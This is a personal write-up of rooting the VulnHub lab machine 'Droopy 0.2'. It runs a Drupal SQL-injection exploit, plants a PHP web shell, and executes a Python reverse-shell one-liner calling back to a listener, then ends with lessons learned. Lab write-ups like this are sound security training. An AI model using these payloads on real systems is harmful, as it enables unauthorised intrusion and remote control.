+++
title = "Droopy 0.2"
date = 2019-02-07
[taxonomies]
tags = ["vulnhub"]
+++

1. Initiated nmap scans using my own custom scripts.

2. Port 80 is opened and running Drupal 7. `robots.txt` shows a lot of disallowed listings.

	* After enumerating the disallowed list, I found out drupal 7.30 is installed.

	* [https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992) - Drupal SQL injection to create administrator credentials

	```bash
	cp /usr/share/exploitdb/exploits/php/webapps/34992.py ./
	```

	```bash
	python 34992.py http://droopy -u admin1 -p admin1
	```

	* It found the site was vulnerable and created account. Using account as "admin" doesn't work as it says you need to active or it's a blocked account.

3. Continuing enumeration process:
	
	```bash
	nikto -h droopy
	```

	* [http://droopy/info.php](http://droopy/info.php)

	* Ubuntu Linux 3.13.0-43-generic
	
	* Apache 2.4.7
	
	* PHP/5.5.9-1ubuntu4.5

	* `nikto` also shows that the page can be exploited by Remote File Inclusion (RFI).

4. **Rabbit hole** - There was a lot of research of UDP and TCP ports and testing out possible exploits. This is a bad rabbit hole to fall into.

5. There was a lot of trial and error at this point for me. I was digging through on how I would execute php files but had no luck with the default uploading forms. When I tried uploading a php file, it would auto rename to txt format. I had tried Googling how you would bypass this mechanism but it's a setting that you will need to edit through CLI. After spending a couple of hours, I took a peak at a walkthrough on how you would perform RFI.

6. In the control panel, go to `Modules` and enable `PHP filter`.

7. Once enabled, configure modify two PHP filter permissions to allow PHP code text format option and for settings.

8. Create a new "Block" page and add the RFI code in the body:

	```html
	<pre><?php system($_GET['c']) ?></pre>
	```

9. Setup netcat:

	```bash
	nc -nvlp 1234
	```

10. Execute python reverse shell one liner:
	
	```bash
	droopy/index.php?c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.242.2.3",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	```

11. Initiated enumeration process for privesc.

	* `linuxprivchecker.py` showed interesting mail data at `/var/mail/www-data` hinting something about `rockyou.txt`.

12. Performed exploit for linux kernel 3.13.0 - [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

13. ROOTED!

### Today I learned

* In step 7, notice that the variable "c" is important. When you execute the RFI URL, you need to have "c" as the variable after the php file so for example `http://droopy/index.php?c=pwd`

### Improvement for next time

* I did have a hunch that if it didn't run my php code natively after creating a page, I should have looked into how you would enable the PHP feature. It was infront of my face but didn't carry though with the task.

* I tried even using the PDF header trick to pass on a php file but that was useless.

* What I really got sidetracked was not fully understanding how RFI works. The part where you have to craft a URL to trigger the RFI.